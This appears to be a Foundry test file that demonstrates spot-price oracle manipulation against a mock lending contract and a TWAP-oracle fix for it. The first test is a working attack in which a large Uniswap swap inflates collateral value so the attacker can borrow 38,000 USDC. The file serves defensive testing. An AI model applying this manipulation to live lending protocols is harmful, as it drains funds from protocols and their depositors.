// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ForkBase} from "test/base/ForkBase.sol";
import {TwapOracle} from "src/oracle/TwapOracle.sol";
import {VulnerableLender} from "./mocks/VulnerableLender.sol";
import {FixedLender} from "./mocks/FixedLender.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";

contract SpotOracleManipulationTest is ForkBase {
    using SafeERC20 for IERC20;

    VulnerableLender internal vulnLender;
    FixedLender internal fixedLender;
    TwapOracle internal oracle;
    address internal usdcWethPair;

    function setUp() public override {
        super.setUp();
        usdcWethPair = factory.getPair(address(usdc), address(weth));

        oracle = new TwapOracle(1800, 600, 86400);
        oracle.update(usdcWethPair);
        vm.warp(block.timestamp + 1800);

        vulnLender = new VulnerableLender(usdcWethPair, address(weth), address(usdc));
        fixedLender = new FixedLender(usdcWethPair, address(weth), address(usdc), address(oracle));

        // Fund lenders with 2,000,000 USDC each to lend out
        fund(address(vulnLender), usdc, 2_000_000 * 1e6);
        fund(address(fixedLender), usdc, 2_000_000 * 1e6);
    }

    /// @notice Attack 01: Exploit VulnerableLender via spot price manipulation
    function test_Attack01_SpotOracleExploit() public {
        uint256 attackerWeth = 5 ether; // Attacker only has 5 WETH (~$13,500 fair value)
        fund(attacker, weth, attackerWeth);

        // Fair borrowing capacity at 75% LTV before pump
        vm.startPrank(attacker);
        weth.forceApprove(address(vulnLender), attackerWeth);
        vulnLender.depositCollateral(attackerWeth);
        uint256 fairBorrowCap = vulnLender.maxBorrowOf(attacker);
        vm.stopPrank();

        // Attacker pumps WETH price on Uniswap V2 pair by dumping 10,000,000 USDC
        uint256 pumpUsdc = 10_000_000 * 1e6;
        fund(attacker, usdc, pumpUsdc);

        vm.startPrank(attacker);
        usdc.forceApprove(address(router), pumpUsdc);
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);
        router.swapExactTokensForTokens(pumpUsdc, 0, path, attacker, block.timestamp);

        // Now WETH spot price is inflated:
        uint256 inflatedBorrowCap = vulnLender.maxBorrowOf(attacker);
        assertGt(inflatedBorrowCap, fairBorrowCap * 3, "Borrow cap inflated > 3x");

        // Attacker borrows inflated amount
        uint256 borrowedUsdc = 38_000 * 1e6;
        vulnLender.borrow(borrowedUsdc);
        vm.stopPrank();

        emit log_named_uint("Fair borrow cap (USDC):", fairBorrowCap);
        emit log_named_uint("Inflated borrow cap (USDC):", inflatedBorrowCap);
        emit log_named_uint("Attacker drained (USDC):", borrowedUsdc);

        assertEq(usdc.balanceOf(attacker), borrowedUsdc);
    }

    /// @notice Mitigation 01: FixedLender uses TwapOracle and resists manipulation
    function test_Attack01_MitigationBlocksManipulation() public {
        uint256 attackerWeth = 5 ether;
        fund(attacker, weth, attackerWeth);

        // Attacker dumps 10,000,000 USDC to move spot
        uint256 pumpUsdc = 10_000_000 * 1e6;
        fund(attacker, usdc, pumpUsdc);

        vm.startPrank(attacker);
        usdc.forceApprove(address(router), pumpUsdc);
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);
        router.swapExactTokensForTokens(pumpUsdc, 0, path, attacker, block.timestamp);

        // Deposit collateral to FixedLender
        weth.forceApprove(address(fixedLender), attackerWeth);
        fixedLender.depositCollateral(attackerWeth);

        // Borrow cap in FixedLender remains at fair TWAP valuation
        uint256 twapBorrowCap = fixedLender.maxBorrowOf(attacker);

        // Attempting to borrow inflated $38,000 USDC reverts
        vm.expectRevert(FixedLender.InsufficientCollateral.selector);
        fixedLender.borrow(38_000 * 1e6);
        vm.stopPrank();

        emit log_named_uint("Protected TWAP borrow cap (USDC):", twapBorrowCap);
        // Valid borrow within fair TWAP limit succeeds
        vm.prank(attacker);
        fixedLender.borrow(twapBorrowCap);
        assertEq(usdc.balanceOf(attacker), twapBorrowCap);
    }
}
